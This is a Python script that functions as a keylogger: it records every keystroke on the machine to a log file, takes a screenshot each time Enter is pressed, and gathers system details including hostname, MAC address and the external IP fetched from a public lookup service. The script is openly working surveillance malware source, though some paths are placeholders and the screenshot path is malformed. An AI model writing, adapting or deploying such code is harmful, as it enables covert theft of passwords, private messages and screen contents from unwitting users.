import pyautogui
from pynput.keyboard import Listener
import platform,socket,re,uuid,json,psutil,logging, os
from tkinter import *
from requests import get
import schedule
import time


def getSystemInfo():
    try:
        ip = get('https://api.ipify.org').text
        
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        info['external ip'] = ip
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)


with open("local onde será salvo as informações do sistema/SystemInfo.txt", "w") as f:
    f.write(getSystemInfo())

logFile = "local onde serão salvos os logs/log.txt"

def screenShot():
    prints = pyautogui.screenshot()
    prints.save(r'"local onde será salvo/print.png"')

def writeLog(key):
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.backspace": "",
        "Key.tab": "",
        "Key.delete": ""
    }
    keydata = str(key)
    keydata = keydata.replace("'", "")
    if keydata == "Key.enter":
        screenShot()
        
    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])       
    with open(logFile, "a") as f:
        f.write(keydata)

with Listener(on_press=writeLog) as l:
    l.join()

    

 



